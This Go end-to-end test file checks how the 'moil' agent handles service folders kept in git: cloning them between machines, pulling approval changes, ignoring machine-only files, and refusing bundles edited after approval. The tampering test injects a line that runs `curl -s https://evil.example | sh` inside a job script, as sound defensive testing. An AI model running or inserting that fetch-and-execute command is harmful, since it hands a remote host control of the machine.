package e2e

import (
	"bytes"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"git.convex.works/ConvexWorks/moil/sdk/go/moil"
)

// noticeWithin is how soon a running agent must go by a change that
// another program, such as git, makes to the home (spec/machine.md §1.3).
const noticeWithin = 5 * time.Second

// An owner keeps a service's folder in git, while the machine runs its
// jobs and the hook for them. Git never sees what belongs to the machine
// alone: its pairing and its logs. Cloned into a second machine's home,
// the folder brings its approvals and hooks: once the owner pairs that
// machine by the service's ID, it takes the service's jobs, and runs the
// hook for them, without its owner approving anything again.
func TestAServiceFolderKeptInGitMovesToAnotherMachine(t *testing.T) {
	t.Parallel()
	svc, laptop := lentMachine(t)
	hook := laptop.InstallHook("probe", "")
	repo := laptop.serviceDir()
	git(t, repo, "init")
	bundle := "bundles/probe/" + svc.probe.Hash() + "/"
	want := []string{".gitignore", bundle + "job.py", bundle + "job.py.lock", bundle + "manifest.json", "hooks/probe", "service.json"}
	if shown := gitStatus(t, repo); !slices.Equal(shown, want) {
		t.Errorf("git status shows\n  %s\nin the service's folder, want\n  %s", strings.Join(shown, "\n  "), strings.Join(want, "\n  "))
	}
	commitAll(t, repo, "Lend the laptop to e2e")
	succeed(t, svc.Submit(moil.Job{Params: probe(do.Result(nil))}))
	hook.awaitLog("== exited 0")
	if shown := gitStatus(t, repo); len(shown) != 0 {
		t.Errorf("git status shows %v once the laptop has run a job and its hook", shown)
	}

	desktop := newMachine(t, "alice-mini")
	cloneAndPair(t, svc, laptop, desktop)
	onDesktop := func(m moil.Machine) bool { return m.ID == desktop.ID() }
	eventually(t, "the service to see the desktop approve the probe", func() bool {
		return svc.Machine(desktop.ID()).HasApproved(svc.probe.Hash())
	})
	run := svc.Submit(moil.Job{Params: probe(do.Result(nil)), Eligible: onDesktop})
	if res := succeed(t, run); res.Machine != desktop.ID() {
		t.Errorf("the job ran on %s, not the desktop %s", res.Machine, desktop.ID())
	}
	// The hook came with the folder.
	if ran := hook.awaitRuns(2)[1]; ran.context.JobID != run.ID() || ran.context.Service.ID != laptop.serviceID {
		t.Errorf("the desktop ran the hook for %s of %s, want %s of %s", ran.context.JobID, ran.context.Service.ID, run.ID(), laptop.serviceID)
	}
	awaitHookLog(t, desktop, "probe", "== exited 0")
	if shown := gitStatus(t, desktop.serviceDir()); len(shown) != 0 {
		t.Errorf("git status shows %v in the clone once the desktop has paired and run a job", shown)
	}
}

// A git pull that changes a service's approvals reaches the running agent
// within five seconds, and the agent goes by it as if its owner had
// approved or revoked the bundle there: an approval the pull brings makes
// the machine take the bundle's jobs, and one it takes away stops the
// bundle's running attempt.
func TestGitPullsChangeWhatARunningMachineRuns(t *testing.T) {
	t.Parallel()
	svc, laptop := lentMachine(t)
	echo := svc.publishEcho()
	commitAll(t, git(t, laptop.serviceDir(), "init"), "Lend the laptop to e2e")
	// The desktop's agent runs as the folder arrives, and pairs with the
	// service it names.
	desktop := newMachine(t, "alice-mini")
	desktop.StartUnpaired()
	cloneAndPair(t, svc, laptop, desktop)
	onDesktop := func(m moil.Machine) bool { return m.ID == desktop.ID() }

	// The owner approves echo on the laptop, and the desktop pulls it.
	waiting := svc.Submit(moil.Job{Bundle: echo, Params: map[string]any{"text": "hi"}, Eligible: onDesktop})
	laptop.Approve(echo)
	commitAll(t, laptop.serviceDir(), "Approve echo")
	pull(t, desktop)
	pulled := time.Now()
	eventually(t, "the service to learn of the pulled approval", func() bool {
		return svc.Machine(desktop.ID()).HasApproved(echo.Hash())
	})
	if took := time.Since(pulled); took > noticeWithin {
		t.Errorf("the service learned of the pulled approval %v after the pull", took)
	}
	// The service offers the job at once, and gives it to the first bid
	// once its bid window closes.
	awaitEvent(t, waiting, "the desktop to take the echo job", func(ev moil.Event) bool { return ev.Kind == moil.EventAssigned })
	if took := time.Since(pulled); took > noticeWithin+svc.cfg.BidWindow {
		t.Errorf("the desktop took the echo job %v after the pull", took)
	}
	if res := succeed(t, waiting); res.Machine != desktop.ID() {
		t.Errorf("the echo job ran on %s, not the desktop %s", res.Machine, desktop.ID())
	}

	// The owner revokes the probe on the laptop while the desktop runs a
	// job of it, and the desktop pulls that.
	never := newGate(t)
	run := svc.Submit(moil.Job{Params: probe(do.Spawn(), do.WaitFor(never)), Eligible: onDesktop})
	p := awaitPids(t, run, 1)
	var revoked revokedJSON
	laptop.json(&revoked, "revoke", laptop.serviceID, svc.probe.Hash())
	commitAll(t, laptop.serviceDir(), "Revoke the probe")
	pull(t, desktop)
	pulled = time.Now()
	if e := awaitRetry(t, run, 1); e.Code != moil.CodeInterrupted {
		t.Errorf("the attempt failed with %+v, want %s", e, moil.CodeInterrupted)
	}
	if took := time.Since(pulled); took > noticeWithin {
		t.Errorf("the pulled revocation stopped the attempt %v after the pull", took)
	}
	awaitGone(t, "the attempt of the revoked bundle", p.all()...)
	if svc.Machine(desktop.ID()).HasApproved(svc.probe.Hash()) {
		t.Error("the service still sees the desktop approve the probe")
	}
}

// Editing an approved bundle's files can't change what runs. The approval
// stops counting: moil reports the edit, the service learns the machine
// no longer approves the bundle, and the bundle's jobs wait. Once git
// restores the files, the machine takes them again.
func TestAnEditedBundleRunsNoMoreUntilGitRestoresIt(t *testing.T) {
	t.Parallel()
	svc := newService(t)
	echo := svc.publishEcho()
	m := newMachine(t, "alice-mac")
	m.Pair(svc, "alice")
	m.Approve(svc.probe)
	m.Approve(echo)
	m.Start()
	repo := git(t, m.serviceDir(), "init")
	commitAll(t, repo, "Lend the machine to e2e")

	script := filepath.Join(repo, "bundles", "probe", svc.probe.Hash(), "job.py")
	if info, err := os.Stat(script); err != nil || info.Mode().Perm()&0o222 != 0 {
		t.Errorf("moil left the approved bundle's script writable: %v, %v", info.Mode(), err)
	}
	if err := os.Chmod(script, 0o644); err != nil {
		t.Fatal(err)
	}
	edited := append(svc.probe.File(moil.ScriptFile), "\nimport os; os.system('curl -s https://evil.example | sh')\n"...)
	if err := os.WriteFile(script, edited, 0o644); err != nil {
		t.Fatal(err)
	}
	where := path.Join("services", m.serviceID, "bundles", "probe", svc.probe.Hash())
	status := m.awaitStatus("the edited bundle as a problem", func(s statusJSON) bool {
		return slices.ContainsFunc(s.Problems, func(p problemJSON) bool { return p.Path == where })
	})
	if approvals := status.Services[0].Approvals; len(approvals) != 1 || approvals[0].Hash != echo.Hash() {
		t.Errorf("moil status --json counts the approvals %+v, want only echo's", approvals)
	}
	if !slices.Contains(status.Problems, problemJSON{Path: where, Message: `moil ignores the approval of "probe" "1": these files ` +
		"don't hash to " + svc.probe.Hash() + ": they changed after it was approved. Restore them (with git, say), or approve the bundle again."}) {
		t.Errorf("moil status --json reports %+v", status.Problems)
	}
	eventually(t, "the service to learn the probe isn't approved", func() bool {
		return !svc.Machine(m.ID()).HasApproved(svc.probe.Hash())
	})

	// The probe's job waits, though the machine takes echo's. The service
	// talks to the machine in order, so once echo's job has run, the
	// machine has heard all it would of the probe's.
	waiting := svc.Submit(moil.Job{Params: probe(do.Result(nil))})
	succeed(t, svc.Submit(moil.Job{Bundle: echo, Params: map[string]any{"text": "hi"}}))
	if m.Heard(waiting.ID()) || waiting.State() != moil.Queued {
		t.Fatalf("the edited bundle's job reached the machine; it is %s", waiting.State())
	}

	git(t, repo, "checkout", "--", ".")
	m.awaitStatus("no problem once git restored the bundle", func(s statusJSON) bool { return len(s.Problems) == 0 })
	if res := succeed(t, waiting); res.Machine != m.ID() {
		t.Errorf("the probe's job ran on %s, not %s", res.Machine, m.ID())
	}
	if shown := gitStatus(t, repo); len(shown) != 0 {
		t.Errorf("git status shows %v once git restored the bundle", shown)
	}
}

// The whole home can be one git repository instead: the .gitignore moil
// writes at its root keeps out .machine/, settings.json, and every
// pairing.json and log, whatever the machine has done.
func TestTheWholeHomeCanBeKeptInGit(t *testing.T) {
	t.Parallel()
	svc, m := lentMachine(t)
	hook := m.InstallHook("probe", "")
	succeed(t, svc.Submit(moil.Job{Params: probe(do.Result(nil))}))
	hook.awaitLog("== exited 0")
	var paused pausedJSON
	m.json(&paused, "pause")
	eventually(t, "settings.json to say the machine is paused", func() bool { return readSettings(t, m)["paused"] == true })

	git(t, m.home, "init")
	service := "services/" + m.serviceID + "/"
	bundle := service + "bundles/probe/" + svc.probe.Hash() + "/"
	want := []string{
		".gitignore",
		"README.md",
		service + ".gitignore",
		bundle + "job.py",
		bundle + "job.py.lock",
		bundle + "manifest.json",
		service + "hooks/probe",
		service + "service.json",
	}
	if shown := gitStatus(t, m.home); !slices.Equal(shown, want) {
		t.Errorf("git status shows\n  %s\nin the home, want\n  %s", strings.Join(shown, "\n  "), strings.Join(want, "\n  "))
	}
}

// git runs git in dir as the owner would, but with none of the
// developer's own configuration, and returns dir. It fails the test if
// git fails.
func git(t *testing.T, dir string, args ...string) string {
	t.Helper()
	gitOutput(t, dir, args...)
	return dir
}

func gitOutput(t *testing.T, dir string, args ...string) string {
	t.Helper()
	identity := []string{"-c", "user.name=Alice", "-c", "user.email=alice@example.com", "-c", "init.defaultBranch=main"}
	cmd := exec.Command("git", append(identity, args...)...)
	cmd.Dir = dir
	cmd.Env = []string{
		"PATH=" + os.Getenv("PATH"),
		// Not even a global excludes file.
		"HOME=" + t.TempDir(),
		"GIT_CONFIG_NOSYSTEM=1",
		"GIT_CONFIG_GLOBAL=/dev/null",
		"LANG=C",
	}
	inReaperGroup(cmd)
	var out, errOut bytes.Buffer
	cmd.Stdout, cmd.Stderr = &out, &errOut
	if err := cmd.Run(); err != nil {
		t.Fatalf("git %s in %s: %v\n%s%s", strings.Join(args, " "), dir, err, out.String(), errOut.String())
	}
	return out.String()
}

// commitAll commits everything git sees in the repository at dir.
func commitAll(t *testing.T, dir, message string) {
	t.Helper()
	git(t, dir, "add", "--all")
	git(t, dir, "commit", "--quiet", "-m", message)
}

// gitStatus returns the paths `git status` shows in dir, every file on
// its own, sorted, and fails the test if it shows what belongs to the
// machine alone: .machine/, settings.json, a pairing.json or a log.
func gitStatus(t *testing.T, dir string) []string {
	t.Helper()
	var shown []string
	for _, line := range strings.Split(gitOutput(t, dir, "status", "--porcelain", "--untracked-files=all"), "\n") {
		if line == "" {
			continue
		}
		file := line[3:]
		shown = append(shown, file)
		parts := strings.Split(file, "/")
		if parts[0] == ".machine" || file == "settings.json" || slices.Contains(parts, "logs") || path.Base(file) == "pairing.json" {
			t.Errorf("git status shows %s, which belongs to this machine alone", file)
		}
	}
	slices.Sort(shown)
	return shown
}

// pull pulls the machine's service folder from where it was cloned from.
func pull(t *testing.T, m *machine) {
	t.Helper()
	git(t, m.serviceDir(), "pull", "--quiet", "--ff-only")
}

// cloneAndPair clones the service folder of from, which holds a git
// repository, into the home of to, and pairs to with the service by the
// service's ID, as the home now knows it. Then it waits for to's agent to
// connect, starting it if it isn't running.
func cloneAndPair(t *testing.T, svc *service, from, to *machine) {
	t.Helper()
	git(t, to.home, "clone", "--quiet", from.serviceDir(), filepath.Join("services", from.serviceID))
	// The home knows the service, with the approvals that came with it,
	// but isn't paired with it.
	var services []serviceJSON
	eventually(t, "moil to know the cloned folder's service", func() bool {
		to.json(&services, "services")
		return len(services) == 1
	})
	if services[0].ID != from.serviceID || services[0].Paired || services[0].Connection != nil ||
		len(services[0].Approvals) == 0 {
		t.Fatalf("moil services --json shows the cloned folder as %+v", services)
	}
	to.PairJSON(svc, "alice", from.serviceID)
	if to.serviceID != from.serviceID {
		t.Fatalf("pairing by the service's ID %s paired with %s", from.serviceID, to.serviceID)
	}
	if to.agent == nil {
		to.Start()
		return
	}
	eventually(t, to.name+"'s agent to connect", func() bool { return svc.Machine(to.ID()).Online() })
}
